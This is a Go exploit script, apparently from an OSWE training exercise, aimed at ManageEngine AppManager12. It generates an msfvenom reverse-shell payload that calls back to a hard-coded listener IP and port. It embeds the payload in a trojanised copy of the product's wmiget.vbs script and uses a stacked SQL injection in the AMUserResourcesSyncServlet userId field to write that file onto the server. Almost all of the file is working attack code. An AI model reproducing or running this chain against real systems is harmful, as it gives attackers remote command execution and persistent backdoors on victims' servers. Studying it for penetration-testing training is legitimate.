package main

import (
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Ex 5.5.2.2 - Write VBS file containing reverse shell payload to system

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func preparePayload() string {
	wmiget := ":On Error Resume Next:Set objWbemLocator = CreateObject(\"WbemScripting.SWbemLocator\")::if Err.Number Then:WScript.Echo vbCrLf & \"Error # \" &             \" \" & Err.Description:End If:On Error GoTo 0::On Error Resume Next::::Select Case WScript.Arguments.Count:Case 2::strComputer = Wscript.Arguments(0):strQuery = Wscript.Arguments(1):Set wbemServices = objWbemLocator.ConnectServer      (strComputer,\"Root\\CIMV2\")::      ::Case 4:strComputer = Wscript.Arguments(0):strUsername = Wscript.Arguments(1):strPassword = Wscript.Arguments(2):strQuery = Wscript.Arguments(3):Set wbemServices = objWbemLocator.ConnectServer      (strComputer,\"Root\\CIMV2\",strUsername,strPassword)::       case 6:               strComputer = Wscript.Arguments(0):       strUsername = Wscript.Arguments(1):        strPassword = Wscript.Arguments(2):       strQuery = Wscript.Arguments(4):       namespace = Wscript.Arguments(5):       :       Set wbemServices = objWbemLocator.ConnectServer      (strComputer,namespace,strUsername,strPassword):Case Else:strMsg = \"Error # in parameters passed\":WScript.Echo strMsg:WScript.Quit(0)::End Select::::Set wbemServices = objWbemLocator.ConnectServer(strComputer, namespace, strUsername, strPassword)::if Err.Number Then:WScript.Echo vbCrLf & \"Error # \"  &             \" \" & Err.Description:End If::On Error GoTo 0::On Error Resume Next::::Set colItems = wbemServices.ExecQuery(strQuery)::if Err.Number Then:WScript.Echo vbCrLf & \"Error # \"  &             \" \" & Err.Description:End If:On Error GoTo 0:::i=0:For Each objItem in colItems:if i=0 then:header = \"\":For Each param in objItem.Properties_:header = header & param.Name & vbTab:Next:WScript.Echo header:i=1:end if:serviceData = \"\":For Each param in objItem.Properties_:serviceData = serviceData & param.Value & vbTab:Next:WScript.Echo serviceData:Next:{SHELL_CODE}:WScript.Quit(0):"

	// 1. run msfvenom to get generated vbs
	utils.PrintInfo("Generating msfvenom payload...")
	cmd := exec.Command("msfvenom", "-a", "x86", "--platform", "windows", "-p", "windows/shell_reverse_tcp", "LHOST=192.168.45.152", "LPORT=1337", "-e", "x86/shikata_ga_nai", "-f", "vbs", "-o", "rev.vbs")
	err := cmd.Run()
	if err != nil {
		log.Fatalln("Failed to run msfvenom: ", err)
	}

	// 2. turn rev.vbs into a one-liner
	utils.PrintInfo("Turning payload into one-liner...")
	data, err := os.ReadFile("rev.vbs")
	if err != nil {
		log.Fatalln("Failed to read rev.vbs: ", err)
	}
	stringData := string(data)

	stripCR := strings.Replace(stringData, "\r", "", -1)
	stripTab := strings.Replace(stripCR, "\t", "", -1)

	conRE := regexp.MustCompile(" _.*?\n")
	stripContinuation := conRE.ReplaceAllString(stripTab, "")

	stripNewline := strings.Replace(stripContinuation, "\n", ":", -1)
	replaceColon := strings.Replace(stripNewline, "::", ":", -1)

	// 3. put payload into wmiget
	fullVBS := strings.Replace(wmiget, "{SHELL_CODE}", replaceColon, -1)

	// 4. base64 URL-safe encoding
	utils.PrintInfo("base64 encoding one-liner...")
	return base64.URLEncoding.EncodeToString([]byte(fullVBS))
}

func uploadVBS(debug bool, ip, payload string) bool {
	sqli := fmt.Sprintf("1;copy (select convert_from(decode($$%s$$,$$base64$$),$$utf-8$$)) "+
		"to $$C:\\\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\"+
		"wmiget.vbs$$;", payload)

	// do necessary URL manipulation
	requestURL := fmt.Sprintf("https://%s:8443/servlet/AMUserResourcesSyncServlet", ip)

	postRequest := utils.PostRequest{
		ContentType: "form",
		FormData: url.Values{
			"ForMasRange": {"1"},
			"userId":      {sqli},
		},
	}

	// send the request
	utils.PrintInfo("Writing file to system...")
	start := time.Now()
	response := utils.SendPostRequest(client, debug, requestURL, postRequest)

	elapsed := time.Since(start).Seconds()
	utils.PrintInfo(fmt.Sprintf("Time taken for response: %fs", elapsed))
	if response.StatusCode == 200 {
		return true
	}

	return false
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 2 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy=<proxyIP>] <target>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{
		Transport: tr,
	}

	payload := preparePayload()

	if uploadVBS(*debug, ip, payload) {
		fmt.Println("")
		utils.PrintSuccess("Done! Check listener for reverse shell!")
	} else {
		utils.PrintFailure("Something went wrong... Check proxy to debug!")
	}
}
